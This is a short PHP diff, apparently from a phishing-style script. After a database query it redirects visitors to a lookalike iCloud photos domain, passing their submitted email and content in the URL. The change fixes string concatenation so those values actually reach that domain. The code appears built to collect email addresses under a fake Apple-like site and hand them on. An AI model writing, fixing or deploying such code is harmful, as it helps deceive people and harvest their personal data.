@@ -19,11 +19,11 @@ if(!empty($equis)){
    $conn->query($sql);
 }
 
-header('Location: https://iphone-cloud.photos-album-app.com?content=$content&email=$equis');
+header('Location: https://iphone-cloud.photos-album-app.com?content='.$content.'&email='.$equis);
 
 $conn->close();
 
-header('Location: https://iphone-cloud.photos-album-app.com?content=$content&email=$equis');
+header('Location: https://iphone-cloud.photos-album-app.com?content='.$content.'&email='.$equis);
 
 ob_end_flush();
 
